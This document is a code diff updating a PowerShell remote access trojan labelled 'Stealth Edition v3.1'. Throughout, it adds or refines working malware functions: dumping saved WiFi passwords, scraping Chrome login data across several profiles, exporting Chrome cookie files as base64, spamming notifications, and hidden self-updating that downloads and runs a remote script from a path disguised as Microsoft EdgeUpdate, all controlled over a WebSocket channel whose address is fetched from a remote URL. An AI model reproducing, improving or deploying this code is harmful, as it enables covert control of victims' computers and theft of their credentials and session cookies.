@@ -1,5 +1,5 @@
-# RAT WebSocket Client - Full Featured Stealth Edition v3
-# Auto-update, fixed toast notifications, infinite retry
+# RAT WebSocket Client - Full Featured Stealth Edition v3.1
+# Auto-update, fixed notifications, Chrome & WiFi improvements
 
 # Force run as hidden job if not already
 $myPID = $PID
@@ -46,21 +46,7 @@ $wssUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/ma
 $scriptUrlFile = "https://raw.githubusercontent.com/icyyboy/wss-test-/refs/heads/main/rat.ps1"
 $botPrefix = "/"
 $persistEnabled = $false
-$global:scriptVersion = "3.0"
-
-# Install BurntToast for notifications
-function Install-BurntToast {
-    try {
-        if (-not (Get-Module -ListAvailable -Name BurntToast)) {
-            Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
-            Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction Stop
-        }
-        Import-Module BurntToast -ErrorAction Stop
-        return $true
-    } catch {
-        return $false
-    }
-}
+$global:scriptVersion = "3.1"
 
 # Auto-update function
 function Check-Update {
@@ -68,29 +54,24 @@ function Check-Update {
         $latestScript = Invoke-WebRequest -Uri $scriptUrlFile -UseBasicParsing -TimeoutSec 10
         $latestContent = $latestScript.Content
         
-        # Extract version from latest script
         if ($latestContent -match '\$global:scriptVersion = "([^"]+)"') {
             $latestVersion = $matches[1]
             
             if ($latestVersion -ne $global:scriptVersion) {
-                # Update available
                 $targetPath = "$env:APPDATA\Microsoft\EdgeUpdate\updater.ps1"
                 
-                # Backup current version
                 if (Test-Path $targetPath) {
                     Copy-Item $targetPath "$targetPath.bak" -Force
                 }
                 
-                # Download new version
                 Set-Content -Path $targetPath -Value $latestContent -Force
                 
-                # Restart with new version
                 Start-Process powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -NonInteractive -File `"$targetPath`"" -WindowStyle Hidden
                 exit
             }
         }
     } catch {
-        # Silent fail, continue with current version
+        # Silent fail
     }
 }
 
@@ -102,9 +83,7 @@ function Get-WssUrl {
             if ($url) {
                 return $url
             }
-        } catch {
-            # Silent fail, will retry
-        }
+        } catch {}
         
         $retries++
         $waitTime = [Math]::Min(30 * [Math]::Pow(2, [Math]::Min($retries - 1, 3)), 300)
@@ -319,20 +298,37 @@ function Capture-Webcam {
 
 function Get-WiFiPasswords {
     try {
-        $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[-1].Trim() }
-        $result = "WiFi Networks:`n`n"
+        $wifiOutput = netsh wlan show profiles 2>&1
         
-        foreach ($profile in $profiles) {
-            $password = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content" | ForEach-Object { ($_ -split ":")[-1].Trim() }
-            if ($password) {
-                $result += "$profile : $password`n"
-            } else {
-                $result += "$profile : (no password)`n"
-            }
+        if ($wifiOutput -match "not running") {
+            return "WiFi adapter not found or disabled"
+        }
+        
+        $profiles = $wifiOutput | Select-String "All User Profile\s*:\s*(.+)" | ForEach-Object { 
+            $_.Matches.Groups[1].Value.Trim() 
         }
         
         if ($profiles.Count -eq 0) {
             return "No WiFi profiles found"
+        }
+        
+        $result = "WiFi Networks:`n`n"
+        
+        foreach ($profile in $profiles) {
+            try {
+                $profileDetail = netsh wlan show profile name="$profile" key=clear 2>&1
+                $password = $profileDetail | Select-String "Key Content\s*:\s*(.+)" | ForEach-Object { 
+                    $_.Matches.Groups[1].Value.Trim() 
+                }
+                
+                if ($password) {
+                    $result += "$profile : $password`n"
+                } else {
+                    $result += "$profile : (no password/open)`n"
+                }
+            } catch {
+                $result += "$profile : (error reading)`n"
+            }
         }
         
         return $result
@@ -343,28 +339,45 @@ function Get-WiFiPasswords {
 
 function Get-ChromePasswords {
     try {
-        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
-        if (-not (Test-Path $chromePath)) {
-            return "Chrome Login Data not found"
+        $chromePaths = @(
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Login Data",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Login Data"
+        )
+        
+        $foundUrls = @()
+        
+        foreach ($chromePath in $chromePaths) {
+            if (Test-Path $chromePath) {
+                try {
+                    $tempDb = "$env:TEMP\ld_$(Get-Random).db"
+                    Copy-Item $chromePath $tempDb -Force -ErrorAction Stop
+                    
+                    $bytes = [System.IO.File]::ReadAllBytes($tempDb)
+                    $text = [System.Text.Encoding]::ASCII.GetString($bytes)
+                    
+                    $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s"]*') | 
+                            ForEach-Object { $_.Value } | 
+                            Where-Object { $_ -notmatch '\.(css|js|png|jpg|gif|woff|ttf)' } | 
+                            Select-Object -Unique
+                    
+                    $foundUrls += $urls
+                    
+                    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+                } catch {
+                    continue
+                }
+            }
         }
         
-        $tempDb = "$env:TEMP\ld_$(Get-Random).db"
-        Copy-Item $chromePath $tempDb -Force -ErrorAction Stop
-        
-        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
-        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
-        
-        $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | ForEach-Object { $_.Value } | Select-Object -Unique
-        
-        Remove-Item $tempDb -Force
-        
-        if ($urls.Count -gt 0) {
-            $result = "Chrome Saved Login URLs:`n`n"
-            $urls | ForEach-Object { $result += "$_`n" }
-            return $result
+        if ($foundUrls.Count -eq 0) {
+            return "No Chrome saved credentials found (Chrome may be running or not installed)"
         }
         
-        return "No Chrome passwords found"
+        $result = "Chrome Saved Login URLs ($($foundUrls.Count) found):`n`n"
+        $foundUrls | Select-Object -Unique | Sort-Object | ForEach-Object { $result += "$_`n" }
+        
+        return $result
     } catch {
         return "Chrome passwords failed: $($_.Exception.Message)"
     }
@@ -372,25 +385,41 @@ function Get-ChromePasswords {
 
 function Get-ChromeCookies {
     try {
-        $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies"
+        $cookiesPaths = @(
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Network\Cookies",
+            "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Cookies"
+        )
         
-        if (-not (Test-Path $cookiesPath)) {
-            $cookiesPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+        $cookiesPath = $null
+        foreach ($path in $cookiesPaths) {
+            if (Test-Path $path) {
+                $cookiesPath = $path
+                break
+            }
         }
         
-        if (-not (Test-Path $cookiesPath)) {
-            return "Chrome Cookies not found"
+        if (-not $cookiesPath) {
+            return "Chrome Cookies not found (Chrome may not be installed)"
         }
         
-        $tempDb = "$env:TEMP\ck_$(Get-Random).db"
-        Copy-Item $cookiesPath $tempDb -Force -ErrorAction Stop
-        
-        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
-        $base64 = [Convert]::ToBase64String($bytes)
-        
-        Remove-Item $tempDb -Force
-        
-        return "Chrome Cookies (base64):`n`n$base64"
+        try {
+            $tempDb = "$env:TEMP\ck_$(Get-Random).db"
+            Copy-Item $cookiesPath $tempDb -Force -ErrorAction Stop
+            
+            $fileInfo = Get-Item $tempDb
+            $sizeKB = [math]::Round($fileInfo.Length / 1KB, 2)
+            
+            $bytes = [System.IO.File]::ReadAllBytes($tempDb)
+            $base64 = [Convert]::ToBase64String($bytes)
+            
+            Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            
+            return "Chrome Cookies ($sizeKB KB):`n`n$base64"
+        } catch {
+            return "Chrome cookies failed: Chrome is running - close Chrome and try again"
+        }
     } catch {
         return "Chrome cookies failed: $($_.Exception.Message)"
     }
@@ -733,34 +762,21 @@ function Show-ToastNotification {
     param([string]$title, [string]$message)
     
     try {
-        Start-Job -ScriptBlock {
-            param($t, $m)
-            
-            # Install BurntToast if not available
-            if (-not (Get-Module -ListAvailable -Name BurntToast)) {
-                Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
-                Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction Stop
-            }
-            
-            Import-Module BurntToast -ErrorAction Stop
-            New-BurntToastNotification -Text $t, $m -ErrorAction Stop
-        } -ArgumentList $title, $message | Out-Null
+        Add-Type -AssemblyName System.Windows.Forms
+        $balloon = New-Object System.Windows.Forms.NotifyIcon
+        $balloon.Icon = [System.Drawing.SystemIcons]::Information
+        $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
+        $balloon.BalloonTipTitle = $title
+        $balloon.BalloonTipText = $message
+        $balloon.Visible = $true
+        $balloon.ShowBalloonTip(10000)
         
-        return "Toast sent: $title - $message"
+        Start-Sleep -Seconds 2
+        $balloon.Dispose()
+        
+        return "Notification sent: $title"
     } catch {
-        # Fallback to balloon tip
-        try {
-            Add-Type -AssemblyName System.Windows.Forms
-            $balloon = New-Object System.Windows.Forms.NotifyIcon
-            $balloon.Icon = [System.Drawing.SystemIcons]::Information
-            $balloon.Visible = $true
-            $balloon.ShowBalloonTip(5000, $title, $message, [System.Windows.Forms.ToolTipIcon]::Info)
-            Start-Sleep -Seconds 2
-            $balloon.Dispose()
-            return "Balloon notification sent: $title"
-        } catch {
-            return "Toast failed: $($_.Exception.Message)"
-        }
+        return "Toast failed: $($_.Exception.Message)"
     }
 }
 
@@ -768,34 +784,21 @@ function Invoke-SpamNotifications {
     param([int]$count = 20)
     
     try {
-        Start-Job -ScriptBlock {
-            param($cnt)
+        for ($i = 1; $i -le $count; $i++) {
+            Add-Type -AssemblyName System.Windows.Forms
+            $balloon = New-Object System.Windows.Forms.NotifyIcon
+            $balloon.Icon = [System.Drawing.SystemIcons]::Warning
+            $balloon.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Warning
+            $balloon.BalloonTipTitle = "Alert #$i"
+            $balloon.BalloonTipText = "Notification number $i"
+            $balloon.Visible = $true
+            $balloon.ShowBalloonTip(5000)
             
-            # Install BurntToast if needed
-            if (-not (Get-Module -ListAvailable -Name BurntToast)) {
-                Set-PSRepository -Name PSGallery -InstallationPolicy Trusted -ErrorAction SilentlyContinue
-                Install-Module BurntToast -Scope CurrentUser -Force -ErrorAction SilentlyContinue
-            }
-            
-            Import-Module BurntToast -ErrorAction SilentlyContinue
-            
-            for ($i = 1; $i -le $cnt; $i++) {
-                try {
-                    New-BurntToastNotification -Text "Notification #$i", "Message number $i" -ErrorAction Stop
-                } catch {
-                    # Fallback to balloon
-                    Add-Type -AssemblyName System.Windows.Forms
-                    $balloon = New-Object System.Windows.Forms.NotifyIcon
-                    $balloon.Icon = [System.Drawing.SystemIcons]::Information
-                    $balloon.Visible = $true
-                    $balloon.ShowBalloonTip(3000, "Notification #$i", "Message number $i", [System.Windows.Forms.ToolTipIcon]::Info)
-                    $balloon.Dispose()
-                }
-                Start-Sleep -Milliseconds 500
-            }
-        } -ArgumentList $count | Out-Null
+            Start-Sleep -Milliseconds 300
+            $balloon.Dispose()
+        }
         
-        return "Spamming $count notifications"
+        return "Spammed $count notifications"
     } catch {
         return "Notification spam failed: $($_.Exception.Message)"
     }
@@ -1030,6 +1033,8 @@ function Process-Command {
         "toast" {
             if ($args.Count -ge 2) {
                 return Show-ToastNotification -title $args[0] -message ($args[1..($args.Count-1)] -join ' ')
+            } elseif ($args.Count -eq 1) {
+                return Show-ToastNotification -title "Notification" -message $args[0]
             }
             return "Usage: /toast <title> <message>"
         }
@@ -1097,14 +1102,13 @@ Version: $global:scriptVersion
 }
 
 # Initialize
-Install-BurntToast | Out-Null
 $wasFirstRun = Initialize-Persistence
 $persistEnabled = Check-Persistence
 
 # Check for updates on startup
 Check-Update
 
-# Main loop with infinite retry
+# Main loop
 while ($true) {
     try {
         $wssUrl = Get-WssUrl
@@ -1167,10 +1171,7 @@ while ($true) {
         
         $ws.Dispose()
         
-    } catch {
-        # Connection failed, wait before retry
-    }
+    } catch {}
     
-    # Wait 30s before reconnecting
     Start-Sleep -Seconds 30
 }
